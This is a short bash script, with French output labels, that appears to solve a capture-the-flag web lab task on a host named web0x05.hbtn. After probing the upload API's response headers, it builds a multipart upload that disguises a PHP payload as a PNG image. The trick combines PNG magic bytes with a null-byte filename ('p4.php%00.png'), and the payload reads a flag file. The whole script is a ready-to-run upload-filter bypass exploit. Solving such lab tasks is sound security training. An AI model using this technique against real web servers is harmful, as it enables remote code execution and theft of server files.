#!/usr/bin/env bash
cd "$(dirname "$0")" || exit 1
clear
H='Host: test-s3.web0x05.hbtn'
B='http://web0x05.hbtn'
URL="$B/api/task4/"

echo "=== GET /task4 : tous les headers ==="
curl -s -D - -o /dev/null -H "$H" "$B/task4"
echo
echo "=== POST vide /api/task4/ : tous les headers ==="
curl -s -D - -o /dev/null -X POST -H "$H" "$URL"
echo
echo "=== Upload PNG-magic+null, petit : tous les headers ==="
PHP='<?php readfile('"'"'FLAG_4.txt'"'"') ?>'
BND='----sep444'
body=/tmp/b4.bin
{
  printf -- "--%s\r\n" "$BND"
  printf 'Content-Disposition: form-data; name="file"; filename="p4.php%%00.png"\r\n'
  printf 'Content-Type: image/png\r\n\r\n'
  printf '%b' '\x89PNG\r\n\x1a\n'
  printf '%s\r\n' "$PHP"
  printf -- "--%s--\r\n" "$BND"
} > "$body"
curl -s -D - -H "$H" -H "Content-Type: multipart/form-data; boundary=$BND" --data-binary @"$body" "$URL"
echo
